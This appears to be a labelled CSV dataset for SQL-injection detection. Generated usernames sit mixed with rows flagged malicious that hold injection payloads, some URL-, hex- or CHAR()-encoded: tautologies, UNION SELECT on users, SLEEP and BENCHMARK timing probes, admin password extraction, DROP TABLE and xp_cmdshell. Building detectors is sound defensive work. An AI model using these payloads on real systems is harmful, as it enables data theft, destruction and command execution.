name,is_malicious
stevenporter%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
daniel28,0
mariehowell,0
smithnancy,0
' OR CHAR(49)=CHAR(49)--,1
markmay,0
barronangela0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
vlambert,0
willisjennifer,0
cynthia25,0
mark49,0
caseyallen,0
ramirezjacqueline' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
deanreynolds,0
jillbuckley,0
zspears,0
bbennett'; DROP TABLE users--,1
thompsonjeff,0
anthony82,0
andersonsarah0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
smallashley,0
wvaldez,0
lisakim,0
david60,0
mercadoedward,0
frank82,0
erik23,0
michele46,0
0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
kennethrichardson,0
melinda10,0
matthew54,0
halllucas,0
hamiltonalex,0
laura58,0
marshshelby,0
ujenkins,0
vberry%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
zwhite,0
williamsjennifer,0
hrussell,0
fmcintyre,0
angela23,0
ykent,0
courtneydavis,0
dunnjulie,0
lparker,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
timfuentes,0
urivera,0
courtney62,0
hsmith,0
timbates,0
"jacqueline69' OR BENCHMARK(10000000,MD5(NOW()))--",1
john23,0
cooperjon,0
pirwin,0
wgarza,0
mitchelldrake,0
"woodrichard'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
jose08,0
donald67,0
lori38,0
ashleygraham,0
keith86,0
taylor24'%27%20OR%201=1--,1
hhall,0
stevensingh,0
howard29,0
laurieayers,0
spencermitchell,0
garrettgregory,0
molinanicholas,0
rachellee,0
santosdiana,0
callahankathy,0
lindsay15,0
nbaker,0
douglas01,0
' OR CHAR(49)=CHAR(49)--,1
ichaney,0
gwright,0
michaelgraham,0
harriserik,0
jacqueline38,0
erichale,0
martinezrachel,0
robert32,0
michellejoyce,0
paul00,0
fieldsbrittney' OR CHAR(49)=CHAR(49)--,1
carlyburns,0
lynn99'/**/OR/**/'1'='1,1
xbrown,0
edwin70,0
ysalazar,0
stephenhernandez,0
adammeyer,0
'%27%20OR%201=1--,1
danacook,0
hstewart,0
jonhudson,0
lee56,0
barreratonya,0
hcaldwell,0
walkerjeffrey,0
richard03,0
carlsonchristopher,0
stevewood,0
rioslarry,0
asimon'||'1'='1,1
rachelsmith' UNION SELECT * FROM users--,1
ericsingleton,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
nperez,0
rodriguezsheila,0
lkelley' OR 0x50=0x50--,1
fuentesrussell,0
richard24,0
anthonybartlett,0
virginiakeith,0
bruceariel,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
jason63,0
jennifer26,0
bob95,0
kimberlyortega,0
amyjohnson,0
pamelajohnson,0
anthony68,0
martinezjason,0
dunlapcarl,0
aguilarrichard,0
lindsaymiller,0
daymatthew,0
hughessherry,0
brooksrobert,0
shannon39,0
rrios,0
'; EXEC xp_cmdshell('dir')--,1
hardingryan,0
ocalhoun,0
susanwilliams,0
tallison,0
qbass,0
yhorn,0
ericksontyler,0
jonesjeffrey,0
troy76,0
zcox,0
cdavis,0
'%20OR%201=1--,1
jacksonalex,0
traceyayers,0
zmoss0x270x200x4f0x520x200x280x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x280x530x450x4c0x450x430x540x280x530x4c0x450x450x500x280x350x290x290x290x620x410x4b0x4c0x290x2d0x2d,1
edominguez,0
riosmichelle,0
staceywhitney,0
oscar96,0
pachecodominic,0
andrewknight,0
'%20OR%201=1--,1
srodriguez,0
"joshuabrown'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
thompsonkathryn'; DROP TABLE users--,1
gestrada,0
stephaniegray,0
berryamy,0
edwardcrosby,0
matthewmora,0
navarrotimothy,0
pamela40,0
0x270x3b0x200x440x520x4f0x500x200x540x410x420x4c0x450x200x750x730x650x720x730x2d0x2d,1
christineporter'; DROP TABLE users--,1
alexandriaboyd,0
jamesabbott,0
williamwalker,0
wgonzalez,0
froth,0
' OR CHAR(49)=CHAR(49)--,1
hayeselizabeth,0
cewing,0
ryanlinda,0
' OR 0x50=0x50--,1
zreed,0
chill,0
andradechristine,0
patriciaparker,0
"melissa46' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
dwilson,0
stevenunderwood,0
"kristinmiller' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
kbaldwin,0
randall85,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
lsolomon,0
cody71'/**/OR/**/'1'='1,1
kimberly27,0
yhancock,0
'%20OR%201=1--,1
pennyrodriguez,0
daniel62,0
tterrell,0
bradleydaniels,0
walkerkelly,0
mooreveronica,0
joepeterson,0
kayla43,0
shari30,0
0x270x250x320x370x250x320x300x4f0x520x250x320x300x310x3d0x310x2d0x2d,1
tom99,0
joseph82,0
gfrye,0
leonardhall,0
' UNION SELECT * FROM users--,1
samanthavaughn,0
moorecynthia,0
' OR '1'='1,1
blackjose,0
mmiller,0
' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
george50,0
stephaniecopeland0x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
mhooper,0
oherrera,0
barbaragutierrez'/**/OR/**/'1'='1,1
zbrown,0
susanmiller,0
robert60,0
bmiller,0
CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
briana42,0
maciasmelinda,0
qnelson,0
jgreene,0
meaganblair,0
blester,0
heather26,0
freemandanielle,0
jessicavaldez,0
%27 %4f%52 %30%78%35%30%3d%30%78%35%30--,1
michelebarber,0
"donna39' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
georgekrause,0
stephaniebuckley,0
jenkinsjeffrey,0
robertnunez,0
meganhernandez,0
shannon37,0
joseherring,0
jessica47,0
'; EXEC xp_cmdshell('dir')--,1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
brandon96,0
james65,0
nicholas67,0
davidwinters,0
jasminebrown,0
nguyenruth,0
chase99%27%7c%7c%27%31%27%3d%27%31,1
bernard24,0
michael49'/**/OR/**/'1'='1,1
johnlang,0
turnerdaniel,0
joseph30,0
velazquezcory,0
devans,0
pinedachristopher,0
snyderkelly,0
christophermclaughlin,0
jessicamorgan,0
'; DROP TABLE users--,1
cshepherd,0
ztorres,0
edwardsjennifer,0
natalie32,0
christopher12,0
ericwarren,0
wpalmer,0
muellersteven,0
lewisleah,0
john91' OR BINARY 'a'='a'--,1
ewilliams,0
howedaisy,0
fwoodard,0
wcooper,0
davidstanley,0
aprilkelley,0
qkeller,0
davidwashington,0
amy97,0
laurencastro,0
parksmark,0
crawfordmark,0
andrew44,0
jennifer75,0
' OR 1=1--,1
dlopez,0
tbarron,0
wallacecurtis,0
stephen60,0
stephanie85,0
"marcusprice' OR BENCHMARK(10000000,MD5(NOW()))--",1
johnsonsamantha,0
crystalmorgan,0
stephanie41,0
' OR 0x50=0x50--,1
srodriguez,0
' OR BINARY 'a'='a'--,1
jamesconley,0
pamelacurtis,0
larsenjames,0
lzhang,0
tmiller,0
'%20OR%201=1--,1
raymondmcbride,0
kylie46,0
anne55,0
harpertimothy' OR 1=1--,1
john12,0
reyesrobert,0
rachelmendoza,0
uhenry,0
' OR 1=1--,1
hfischer,0
ukeller,0
williamsjaime,0
alexa19,0
milesmegan,0
tinarichardson,0
wilsonmorgan,0
colleen66,0
vegadiane,0
alishaclay,0
krystalrodriguez,0
robertwilliams,0
campbellkendra,0
youngmegan,0
amberharrison,0
wanda27,0
soliskenneth,0
davidrobbins,0
haley30,0
manningdanielle,0
cgeorge,0
laura42,0
jose78,0
jeaton,0
sgrant,0
kellymiranda,0
mcdonaldjoseph,0
jeffery04,0
lspencer,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
rojasjohn,0
trevorneal,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
josephturner,0
jonesmaurice'||'1'='1,1
drowland,0
pattyfuentes,0
zowens,0
renee78,0
caseyknight,0
ginabennett,0
ucarey,0
connorpeterson,0
keith31,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
lauren36,0
dilloncollins,0
gregorywagner' OR SOUNDEX('test')=SOUNDEX('test')--,1
nschwartz'/**/OR/**/'1'='1,1
cmcfarland,0
castillomarc,0
harrissavannah,0
bernardlewis,0
andersonlaura,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(66)CHAR(73)CHAR(78)CHAR(65)CHAR(82)CHAR(89)CHAR(32)CHAR(39)CHAR(97)CHAR(39)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(45)CHAR(45),1
knightsteven,0
christykelley,0
shannonweber,0
walter34,0
sarah31,0
lchen,0
ibanks,0
%27 %4f%52 %27%31%27%3d%27%31,1
washingtonyvonne,0
nataliemarsh,0
gcampbell,0
christina00,0
smithmiguel,0
kelseyevans,0
stacybrown,0
john08,0
phillip50'%27%20OR%201=1--,1
christophersimpson,0
katherinebrown,0
mjohnson,0
tinawaters,0
ogreer,0
stevenrivera,0
pbaker,0
kathleenmartin,0
'%27%20OR%201=1--,1
sandra59,0
donaldmoore,0
kwyatt,0
leslie92,0
theresawashington,0
donnaowens,0
fskinner,0
blackwellmaxwell,0
matthewnguyen,0
yhawkins,0
gbradley,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(61)CHAR(67)CHAR(72)CHAR(65)CHAR(82)CHAR(40)CHAR(52)CHAR(57)CHAR(41)CHAR(45)CHAR(45),1
coxjesse,0
hayesryan,0
leblancrichard,0
summer82,0
hchen,0
chasejoan0x270x3b0x200x450x580x450x430x200x780x700x5f0x630x6d0x640x730x680x650x6c0x6c0x280x270x640x690x720x270x290x2d0x2d,1
ambernguyen,0
gomeztamara,0
diazadam,0
diana60,0
hscott,0
suzanne62,0
smithpeter,0
kimbrown,0
